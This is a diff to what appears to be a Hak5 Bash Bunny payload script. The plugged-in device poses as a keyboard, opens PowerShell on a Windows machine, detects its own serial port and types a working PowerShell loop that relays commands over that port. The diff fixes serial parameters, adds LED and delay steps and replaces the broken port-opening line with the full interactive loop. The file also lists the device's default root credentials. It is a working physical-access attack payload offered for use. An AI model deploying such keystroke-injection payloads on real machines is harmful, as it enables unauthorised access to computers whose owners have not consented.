@@ -13,21 +13,23 @@ ATTACKMODE HID
 # Configuration
 BAUD="115200"
 DATA_BITS="8"
-PARITY_BIT="No"
-STOP_BIT="1"
+PARITY_BIT="None"
+STOP_BIT="One"
 BUNNY_USER="root"
 BUNNY_PASS="hak5bunny"
 COM_SLEEP="5" #Must match $Race_Delay/1000
 RACE_DELAY="5000" #Must match $COM_SLEEP*5
 
 # Payload
+LED ATTACK
 RUN WIN "powershell -NoExit"
+QUACK DELAY 2000
 QUACK "\$PRESERIALBUNNY = [System.IO.Ports.SerialPort]::GetPortNames(); Start-Sleep -Seconds 1; \$POSTSERIALBUNNY = [System.IO.Ports.SerialPort]::GetPortNames(); \$BUNNYCOM = (Compare-Object \$PRESERIALBUNNY \$POSTSERIALBUNNY | Where-Object { \$_.SideIndicator -eq '=>' }).InputObject"
 QUACK ENTER
+LED SPECIAL
 ATTACKMODE HID SERIAL #5 Second race for the A-B math (needs better solution)
 QUACK DELAY $RACE_DELAY
-QUACK STRING "\$SERIAL = New-Object System.IO.Ports.SerialPort \$BUNNYCOM,$BAUD,'$DATA_BITS',$PARITY_BIT,'$STOP_BIT'
 QUACK ENTER
-QUACK STRING "\$SERIAL.Open()"
+QUACK STRING "\$Port=New-Object System.IO.Ports.SerialPort(\$BUNNYCOM,$BAUD,[System.IO.Ports.Parity]::$PARITY_BIT,$DATA_BITS,[System.IO.Ports.StopBits]::$STOP_BIT);\$Port.Open();while(\$Port.IsOpen){while(\$Port.BytesToRead -gt 0){Write-Host -NoNewline \$Port.ReadExisting()};\$cmd=Read-Host;if(\$cmd -eq 'exit'){break};\$Port.WriteLine(\$cmd)};\$Port.Close()"
 QUACK ENTER
 LED FINISH
